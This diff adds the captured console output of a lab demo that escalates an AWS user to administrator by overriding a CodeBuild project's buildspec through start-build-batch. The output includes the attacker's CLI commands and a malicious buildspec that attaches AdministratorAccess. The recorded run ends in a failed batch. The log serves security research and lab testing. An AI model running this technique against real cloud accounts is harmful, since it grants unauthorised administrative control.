@@ -1,0 +1,89 @@
+[0;32m========================================[0m
+[0;32mCodeBuild StartBuildBatch Privilege Escalation Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-codebuild-003-to-admin-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Region: us-east-1
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+  Denied helpful permissions on user: pl-prod-codebuild-003-to-admin-starting-user
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Configuring AWS CLI with starting user credentials[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-codebuild-003-to-admin-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying we don't have admin permissions yet[0m
+Attempting to list IAM users (should fail)...
+[2m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed: Cannot list IAM users (as expected)[0m
+
+[1;33mStep 5: Discovering existing CodeBuild projects[0m
+Attempting to list CodeBuild projects...
+[2m[ReadOnly] $ aws codebuild list-projects --region us-east-1 --query 'projects' --output text[0m
+Found projects:
+pl-prod-codebuild-003-to-admin-target-project
+pl-prod-codebuild-002-to-admin-existing-project
+[0;32m✓ Successfully listed projects[0m
+
+[1;33mStep 6: Getting target project details[0m
+Target project: pl-prod-codebuild-003-to-admin-target-project
+[2m[ReadOnly] $ aws codebuild batch-get-projects --region us-east-1 --names "pl-prod-codebuild-003-to-admin-target-project" --query 'projects[0]' --output json[0m
+Project service role: arn:aws:iam::123456789012:role/pl-prod-codebuild-003-to-admin-target-role
+[0;32m✓ Retrieved project details[0m
+
+[1;33mStep 7: Preparing malicious buildspec with batch format[0m
+Creating buildspec that will attach AdministratorAccess policy to our user...
+Buildspec file: /tmp/malicious-buildspec.yml
+[0;34mBuildspec contents:[0m
+version: 0.2
+batch:
+  fast-fail: false
+  build-list:
+    - identifier: privesc_build
+      buildspec: |
+        version: 0.2
+        phases:
+          build:
+            commands:
+              - echo "Starting privilege escalation..."
+              - aws iam attach-user-policy --user-name pl-prod-codebuild-003-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+              - echo "Successfully attached AdministratorAccess policy to pl-prod-codebuild-003-to-admin-starting-user"
+
+[0;32m✓ Malicious buildspec prepared[0m
+
+[1;33mStep 8: Starting build batch with buildspec-override[0m
+This is the privilege escalation vector - overriding the buildspec...
+Project: pl-prod-codebuild-003-to-admin-target-project
+The build will execute with the project's admin role permissions
+
+
+[0;36m[Attacker] $ aws codebuild start-build-batch --region us-east-1 --project-name "pl-prod-codebuild-003-to-admin-target-project" --buildspec-override file://"/tmp/malicious-buildspec.yml" --output json[0m
+Build Batch ID: pl-prod-codebuild-003-to-admin-target-project:58cf499f-90e2-41ec-a153-eb8c9f319063
+Initial Status: IN_PROGRESS
+[0;32m✓ Build batch started successfully[0m
+
+[1;33mStep 9: Monitoring build batch execution[0m
+Waiting for build batch to complete...
+This may take 2-3 minutes for batch build orchestration...
+
+[2m[ReadOnly] $ aws codebuild batch-get-build-batches --region us-east-1 --ids "pl-prod-codebuild-003-to-admin-target-project:58cf499f-90e2-41ec-a153-eb8c9f319063" --output json[0m
+[0s] Build batch status: FAILED
+[0;31mBuild batch failed with status: FAILED[0m
+Check CodeBuild logs for details
+
+[1;33m[demo_permissions] Script interrupted, restoring permissions...[0m
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-codebuild-003-to-admin-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
